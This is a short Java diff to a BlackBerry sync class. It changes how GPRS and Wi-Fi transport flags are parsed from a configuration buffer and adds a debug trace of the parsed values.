@@ -17,7 +17,6 @@ import blackberry.action.sync.transport.BisTransport;
 import blackberry.action.sync.transport.DirectTransport;
 import blackberry.action.sync.transport.Wap2Transport;
 import blackberry.action.sync.transport.WifiTransport;
-import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.utils.Check;
@@ -51,14 +50,17 @@ public class SyncActionInternet extends SyncAction {
                 confParams.length, false);
 
         try {
-            gprs = databuffer.readInt() == 1;
-            wifi = databuffer.readInt() == 1;
+            wifi = true;
+            
+            int dgprs = databuffer.readInt();
+            int dwifi = databuffer.readInt();
 
-            if (Conf.SYNCACTION_FORCE_WIFI) {
-                wifiForced = wifi;
-            } else {
-                wifiForced = false;
-            }
+            //#ifdef DEBUG
+            debug.trace("parse gprs=" + dgprs + " wifi=" + dwifi);
+            //#endif
+
+            gprs = dgprs == 1;
+            wifiForced = dwifi == 1;
 
             bis = gprs;
             bes = gprs;
